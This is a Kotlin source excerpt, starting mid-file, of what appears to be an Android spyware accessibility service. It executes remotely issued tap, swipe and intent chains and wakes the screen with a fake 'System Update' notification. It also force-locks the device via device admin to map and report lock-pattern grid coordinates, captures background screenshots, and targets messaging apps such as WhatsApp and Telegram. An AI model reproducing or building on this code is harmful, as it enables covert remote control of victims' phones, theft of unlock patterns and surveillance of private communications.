            if (findTextInside(node.getChild(i), text)) return true
        }
        return false
    }

    private fun extractText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        if (node.text != null && node.text.isNotEmpty()) sb.append(node.text).append(" ")
        for (i in 0 until node.childCount) extractText(node.getChild(i), sb)
    }

    fun serializeNode(node: AccessibilityNodeInfo?, depth: Int, maxDepth: Int): JSONObject? {
        if (node == null || depth > maxDepth) return null
        val json = JSONObject()
        try {
            json.put("class", node.className?.toString() ?: "")
            json.put("text", node.text?.toString() ?: "")
            json.put("desc", node.contentDescription?.toString() ?: "")
            json.put("id", node.viewIdResourceName ?: "")
            json.put("clickable", node.isClickable)
            
            val bounds = android.graphics.Rect()
            node.getBoundsInScreen(bounds)
            json.put("bounds", "${bounds.left},${bounds.top},${bounds.right},${bounds.bottom}")

            if (node.childCount > 0 && depth < maxDepth) {
                val children = JSONArray()
                for (i in 0 until node.childCount) {
                    val child = serializeNode(node.getChild(i), depth + 1, maxDepth)
                    if (child != null) children.put(child)
                }
                json.put("children", children)
            }
        } catch (e: Exception) {}
        return json
    }

    fun getInstantTree(targetPkg: String?, maxDepth: Int): JSONObject {
        val result = JSONObject()
        try {
            val root = rootInActiveWindow ?: return result.put("error", "NO_ACTIVE_WINDOW")
            val currentPkg = root.packageName?.toString() ?: ""
            
            if (targetPkg != null && targetPkg != "null" && targetPkg != currentPkg) {
                return result.put("error", "TARGET_NOT_IN_FOREGROUND").put("found", currentPkg)
            }

            result.put("package", currentPkg)
            result.put("timestamp", System.currentTimeMillis())
            result.put("tree", serializeNode(root, 0, maxDepth))
        } catch (e: Exception) { result.put("error", e.message) }
        return result
    }

    override fun onInterrupt() {}

    // --- REMOTE INTERACTION ENGINE (CHAIN CAPABLE) ---
    suspend fun executeInteractionChain(chain: JSONArray): String {
        DebugLogger.log("CHAIN_START", "Received chain with ${chain.length()} steps: $chain")
        val report = StringBuilder()
        for (i in 0 until chain.length()) {
            val step = chain.getJSONObject(i)
            val type = step.optString("type").uppercase()
            val value = step.optString("val")
            val stepDelay = step.optLong("delay", 100L)
            
            DebugLogger.log("CHAIN_STEP", "Executing Step $i: TYPE=$type, VAL=$value, DELAY=$stepDelay")
            delay(stepDelay) // Short mandatory delay between steps for OS processing

            val success = try {
                when (type) {
                    "WAIT" -> { 
                        val waitTime = value.toLongOrNull() ?: 500L
                        DebugLogger.log("CHAIN_WAIT", "Sleeping for ${waitTime}ms")
                        delay(waitTime)
                        true 
                    }
                    "WAKE" -> {
                        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
                            android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
                            android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:ChainWake")
                        wakeLock.acquire(3000)

                        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                        val channelId = "system_integrity_alerts"
                        
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            val channel = android.app.NotificationChannel(channelId, "System Integrity", android.app.NotificationManager.IMPORTANCE_HIGH)
                            channel.setSound(null, null)
                            channel.enableVibration(false)
                            nm.createNotificationChannel(channel)
                        }

                        val intent = android.content.Intent(applicationContext, PulseActivity::class.java).apply {
                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_USER_ACTION or android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                            putExtra("is_wake_trigger", true)
                            if (value.contains("wellbeing", ignoreCase = true)) putExtra("route_to_settings", true)
                        }

                        val pendingIntent = android.app.PendingIntent.getActivity(
                            applicationContext, 99, intent, 
                            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                        )

                        val builder = androidx.core.app.NotificationCompat.Builder(applicationContext, channelId)
                            .setSmallIcon(android.R.drawable.ic_menu_info_details)
                            .setContentTitle("System Update")
                            .setContentText("Synchronizing system health parameters...")
                            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
                            .setFullScreenIntent(pendingIntent, true)
                            .setAutoCancel(true)
                            .setTimeoutAfter(3000)

                        nm.notify(99, builder.build())
                        DebugLogger.log("CHAIN_WAKE", "Strong FSI Wake lock dispatched")
                        true
                    }
                    "NAV" -> {
                        val actionCode = when(value.uppercase()) {
                            "BACK" -> GLOBAL_ACTION_BACK
                            "HOME" -> GLOBAL_ACTION_HOME
                            "RECENTS" -> GLOBAL_ACTION_RECENTS
                            "NOTIFS" -> GLOBAL_ACTION_NOTIFICATIONS
                            else -> 0
                        }
                        if (actionCode == 0) {
                            DebugLogger.log("CHAIN_NAV_ERR", "Unknown nav action: $value")
                            false
                        } else {
                            val res = performGlobalAction(actionCode)
                            DebugLogger.log("CHAIN_NAV", "Nav $value executed: $res")
                            res
                        }
                    }
                    "TAP" -> {
                        val coords = value.split("|", ",")
                        if (coords.size >= 2) {
                            dispatchClick(coords[0].toFloat(), coords[1].toFloat())
                        } else {
                            DebugLogger.log("CHAIN_TAP_ERR", "Invalid coordinates: $value")
                            false
                        }
                    }
                    "NODE" -> {
                        val root = rootInActiveWindow
                        val nodes = root?.findAccessibilityNodeInfosByViewId(value)
                        val node = nodes?.firstOrNull() ?: root?.findAccessibilityNodeInfosByText(value)?.firstOrNull()
                        if (node != null) {
                            val bounds = android.graphics.Rect()
                            node.getBoundsInScreen(bounds)
                            DebugLogger.log("CHAIN_NODE", "Found node '$value' at ${bounds.exactCenterX()}, ${bounds.exactCenterY()}")
                            dispatchClick(bounds.centerX().toFloat(), bounds.centerY().toFloat())
                        } else {
                            DebugLogger.log("CHAIN_NODE_ERR", "Node '$value' not found in active window")
                            false
                        }
                    }
                    "SWIPE" -> {
                        val p = value.split("|", ",")
                        if (p.size >= 4) {
                            dispatchGesturePath(listOf(Pair(p[0].toFloat(), p[1].toFloat()), Pair(p[2].toFloat(), p[3].toFloat())), p.getOrNull(4)?.toLongOrNull() ?: 300L)
                        } else {
                            DebugLogger.log("CHAIN_SWIPE_ERR", "Invalid swipe coords: $value")
                            false
                        }
                    }
                    "PATH" -> {
                        val p = value.split("|", ",")
                        if (p.size >= 4) {
                            val points = mutableListOf<Pair<Float, Float>>()
                            val hasDuration = p.size % 2 != 0
                            val limit = if (hasDuration) p.size - 1 else p.size
                            for (j in 0 until limit step 2) {
                                points.add(Pair(p[j].toFloat(), p[j+1].toFloat()))
                            }
                            val duration = if (hasDuration) p.last().toLongOrNull() ?: 1000L else 1000L
                            dispatchGesturePath(points, duration)
                        } else {
                            DebugLogger.log("CHAIN_PATH_ERR", "Invalid path coords. Need pairs of X,Y: $value")
                            false
                        }
                    }
                    "INTENT" -> {
                        try {
                            val json = JSONObject(value)
                            val intent = android.content.Intent(json.optString("action", android.content.Intent.ACTION_VIEW))
                            val dataStr = json.optString("data", "")
                            if (dataStr.isNotEmpty()) {
                                val safeData = if (dataStr.startsWith("tel:", ignoreCase = true)) dataStr.replace("#", "%23") else dataStr
                                intent.data = android.net.Uri.parse(safeData)
                            }
                            if (json.has("pkg")) intent.setPackage(json.getString("pkg"))
                            val typeStr = json.optString("type", "")
                            if (typeStr.isNotEmpty()) {
                                if (intent.data != null) intent.setDataAndType(intent.data, typeStr)
                                else intent.type = typeStr
                            }
                            val extras = json.optJSONObject("extras")
                            extras?.keys()?.forEach { key ->
                                val v = extras.get(key)
                                if (v is Boolean) intent.putExtra(key, v)
                                else if (v is Int) intent.putExtra(key, v)
                                else intent.putExtra(key, v.toString())
                            }
                            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                            val target = json.optString("target", "activity").lowercase()
                            when (target) {
                                "service" -> { if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent) }
                                "broadcast" -> sendBroadcast(intent)
                                else -> startActivity(intent)
                            }
                            true
                        } catch (e: Exception) {
                            DebugLogger.log("CHAIN_INTENT_ERR", e.toString())
                            false
                        }
                    }
                    else -> {
                        DebugLogger.log("CHAIN_ERR", "Unknown step type: $type")
                        false
                    }
                }
            } catch (e: Exception) {
                DebugLogger.log("CHAIN_EXC", "Exception in step $i: ${e.message}")
                false
            }
            
            DebugLogger.log("CHAIN_RESULT", "Step $i result: ${if(success) "SUCCESS" else "FAILED"}")
            report.append("Step $i ($type): ${if(success) "OK" else "FAIL"}; ")
        }
        DebugLogger.log("CHAIN_END", "Chain execution finished. Report: $report")
        return report.toString()
    }

        private suspend fun dispatchClick(x: Float, y: Float): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val km = getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
        
        DebugLogger.log("GHOST_DEBUG", "Attempting Tap at [$x, $y] | Screen: ${pm.isInteractive} | Locked: ${km.isKeyguardLocked}")

        val path = android.graphics.Path()
        path.moveTo(x, y)
        // BUGFIX: Move 1 pixel down and to the right to prevent native Gesture Recognizer math from hanging on perfectly overlapping lines
        path.lineTo(x + 1f, y + 1f)

        val builder = android.accessibilityservice.GestureDescription.Builder()
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50)) // 50ms is clean and fast for a standard tap
        
        val deferred = CompletableDeferred<Boolean>()
        try {
            val dispatched = dispatchGesture(builder.build(), object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST", "Gesture confirmed by OS at $x,$y")
                    deferred.complete(true)
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST_ERR", "Gesture REJECTED by OS. Check if screen is locked or overlapping system UI.")
                    deferred.complete(false)
                }
            }, null) // Passing null forces it automatically onto the main service thread
            
            if (!dispatched) {
                DebugLogger.log("GHOST_ERR", "dispatchGesture returned false immediately.")
                deferred.complete(false)
            }
        } catch (e: Exception) {
            DebugLogger.log("GHOST_FATAL", "Gesture Dispatch Failed: ${e.message}")
            deferred.complete(false)
        }
        
        // Wait for OS callback, but safeguard against infinite hang if OS drops the event
        val result = withTimeoutOrNull(2000) { deferred.await() }
        if (result == null) {
            DebugLogger.log("GHOST_TIMEOUT", "OS dropped the gesture event silently (Timeout after 2000ms)")
            return false
        }
        return result
    }

    private suspend fun dispatchGesturePath(points: List<Pair<Float, Float>>, dur: Long): Boolean {
        val path = android.graphics.Path()
        val start = points.first()
        path.moveTo(start.first, start.second)
        
        points.drop(1).forEach { (x, y) ->
            path.lineTo(x, y)
        }

        val builder = android.accessibilityservice.GestureDescription.Builder()
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, dur))
        
        val deferred = CompletableDeferred<Boolean>()
        try {
            val dispatched = dispatchGesture(builder.build(), object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST", "Gesture Path Completed")
                    deferred.complete(true)
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST_ERR", "Gesture Cancelled by System")
                    deferred.complete(false)
                }
            }, Handler(Looper.getMainLooper()))
            
            if (!dispatched) deferred.complete(false)
        } catch (e: Exception) {
            DebugLogger.log("GHOST_FATAL", e.message ?: "Unknown")
            deferred.complete(false)
        }
        
        return withTimeoutOrNull(dur + 2000) { deferred.await() } ?: false
    }

    suspend fun executeMapGridSequence(cmdId: Int, depth: Int) {
        DebugLogger.log("MAP_GRID", "Starting grid discovery sequence...")
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val adminComponent = android.content.ComponentName(this, MyDeviceAdminReceiver::class.java)
        
        // 1. FORCE LOCK
        if (dpm.isAdminActive(adminComponent)) {
            dpm.lockNow()
            delay(2000) // Wait for screen to fully settle
        } else {
            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "FAILED_ADMIN", "Device Admin not active")
            return
        }

        // 2. WAKE
        val intent = Intent("WAKE").apply { putExtra("val", "standard") }
        // Re-use internal dispatcher logic via a synthetic call or just call the NAV/WAKE block
        // For reliability, we trigger the WAKE step manually:
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:GridWake")
        wakeLock.acquire(3000)
        val pulseIntent = android.content.Intent(applicationContext, PulseActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_USER_ACTION or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra("is_wake_trigger", true)
        }
        startActivity(pulseIntent)
        delay(1200)

        // 3. SWIPE UP (To show Pattern View)
        val metrics = resources.displayMetrics
        val centerX = metrics.widthPixels / 2f
        val bottom = metrics.heightPixels * 0.9f
        val top = metrics.heightPixels * 0.2f
        dispatchGesturePath(listOf(Pair(centerX, bottom), Pair(centerX, top)), 400)
        delay(1000)

        // 4. SCRAPE & MATH
        val root = rootInActiveWindow
        val tree = serializeNode(root, 0, depth)
        val result = JSONObject()
        
        fun findPatternNode(node: JSONObject?): JSONObject? {
            if (node == null) return null
            if (node.optString("id").contains("lockPatternView", ignoreCase = true)) return node
            val children = node.optJSONArray("children")
            if (children != null) {
                for (i in 0 until children.length()) {
                    val found = findPatternNode(children.getJSONObject(i))
                    if (found != null) return found
                }
            }
            return null
        }

        val patternNode = findPatternNode(tree)
        if (patternNode != null) {
            val boundsStr = patternNode.getString("bounds")
            val b = boundsStr.split(",").map { it.toInt() }
            val L = b[0]; val T = b[1]; val R = b[2]; val B = b[3]
            val W = R - L; val H = B - T
            
            val grid = JSONObject()
            for (row in 1..3) {
                for (col in 1..3) {
                    val dotX = L + (W * (2 * col - 1) / 6)
                    val dotY = T + (H * (2 * row - 1) / 6)
                    grid.put("dot_${(row-1)*3 + col}", "$dotX,$dotY")
                }
            }
            
            result.put("grid_coordinates", grid)
            result.put("view_bounds", boundsStr)
            result.put("screen_res", "${metrics.widthPixels}x${metrics.heightPixels}")
            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "MAP_SUCCESS", null, result, null)
            DebugLogger.log("MAP_GRID", "Success. Coordinates exfiltrated.")
        } else {
            result.put("raw_tree_snapshot", tree)
            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "MAP_FAILED", "lockPatternView not found in tree", result, null)
            DebugLogger.log("MAP_GRID", "Failed: Pattern view not found.")
        }
    }

    fun captureScreenshot(quality: Int, callback: (java.io.File?) -> Unit) {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
            DebugLogger.log("SCREENSHOT_ERR", "API 30+ required for background screenshot.")
            callback(null)
            return
        }

        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, applicationContext.mainExecutor, object : AccessibilityService.TakeScreenshotCallback {
            override fun onSuccess(screenshot: ScreenshotResult) {
                try {
                    val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                    if (bitmap == null) { callback(null); return }
                    
                    val file = java.io.File(cacheDir, "scrn_${System.currentTimeMillis()}.jpg")
                    java.io.FileOutputStream(file).use { out ->
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, out)
                    }
                    screenshot.hardwareBuffer.close()
                    callback(file)
                } catch (e: Exception) {
                    DebugLogger.log("SCREENSHOT_ERR", "Processing failed: ${e.message}")
                    callback(null)
                }
            }
            override fun onFailure(errorCode: Int) {
                DebugLogger.log("SCREENSHOT_ERR", "System denied capture. Error code: $errorCode")
                callback(null)
            }
        })
    }

    private fun getDefaultRules(): JSONObject {
        val defaults = JSONObject()
        val apps = listOf("com.google.android.apps.messaging", "com.samsung.android.messaging", "com.whatsapp", "org.telegram.messenger", "org.telegram.plus", "com.imo.android.imoim", "com.imo.android.imoimlite", "com.imo.android.imoimbeta", "com.imo.android.imoimhd", "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android")
        for (app in apps) defaults.put(app, JSONObject())
        return defaults
    }
}
